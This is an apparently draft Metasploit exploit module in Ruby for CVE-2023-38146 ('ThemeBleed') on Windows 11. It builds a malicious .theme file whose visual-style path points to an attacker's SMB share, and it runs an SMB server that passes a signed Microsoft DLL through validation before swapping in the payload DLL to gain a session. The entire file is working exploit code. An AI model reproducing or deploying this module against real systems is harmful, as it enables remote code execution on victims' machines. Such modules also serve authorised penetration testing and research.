##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::SMB::Server
  include Msf::Exploit::EXE
  include Msf::Post::File


  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TBD',
        'Description' => %q{
          TBD
        },
        'DisclosureDate' => '2023-09-13',
        'Author' => [
          'gabe_k',  # Discovery/PoC
          'bwatters-r7' # msf exploit
        ],
        'References' => [
          ['CVE', '2023-38146'],
          ['URL', 'https://exploits.forsale/themebleed/'],
          ['URL', 'https://github.com/gabe-k/themebleed/tree/main']

        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Targets' => [
          [ 'Windows', {} ],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
        }
      )
    )

    register_options([
                       OptPath.new('MS_SIGNED_DLL', [true, 'Signed Microsoft DLL to use for passing validation']),
                       OptPath.new('MS_VERSION_DLL', [true, 'Signed Microsoft DLL to use for passing validation'])
                     ])
  end

  def make_theme
    vprint_status('make_theme')
    theme_file = <<-theme
; windows 11 theme exploit
; copyright 2023 fukin software foundation

[Theme]
DisplayName=@%SystemRoot%\System32\themeui.dll,-2060

[Control Panel\Desktop]
Wallpaper=%SystemRoot%\web\wallpaper\Windows\img0.jpg
TileWallpaper=0
WallpaperStyle=10

[VisualStyles]
Path=\\REPLACE_IP_ADDRESS\REPLACE_SHARENAME\REPLACE_FILE_NAME
ColorStyle=NormalColor
Size=NormalSize

[MasterThemeSelector]
MTSM=RJSPBS
theme
    vprint_status('1')
    theme_file.gsub!('REPLACE_IP_ADDRESS', datastore['SRVHOST'])
    vprint_status('2')
    theme_file.gsub!('REPLACE_SHARENAME', @share)
    vprint_status('3')
    theme_file.gsub!('REPLACE_FILE_NAME', @file_name)
    vprint_status('4')
    return theme_file
  end

  def smb_file_array
    vprint_status('smb_file_array')
    signed_dll = File.binread(datastore['MS_SIGNED_DLL'])
    vprint_status('payload is nil') if payload.nil?
    vprint_status('signed_dll is nil') if signed_dll.nil?
    [ payload, signed_dll ]
  end

  def version_check_file
    File.binread(datastore['MS_VERSION_DLL'])
  end

  def start_smb_server
    vprint_status('start_smb_server')
    vprint_status('1')
    files = smb_file_array
    vprint_status('2')
    virtual_disk = RubySMB::Server::Share::Provider::VirtualDisk.new(@share)
    vprint_status('3')
    virtual_disk.add_static_file(@file_name, version_check_file)
    vprint_status('4')
    virtual_disk.add_dynamic_file('_vrf.dll') do
      files.pop
    end
    vprint_status('5')
    service.add_share(virtual_disk)
  end

  def exploit
    vprint_status('exploit')
    @share = 'share_name'
    @file_name = 'helloworld'
    @file_name << '.msstyles'
    vprint_status(@file_name)
    file_create(make_theme)
    start_smb_server
  end
end
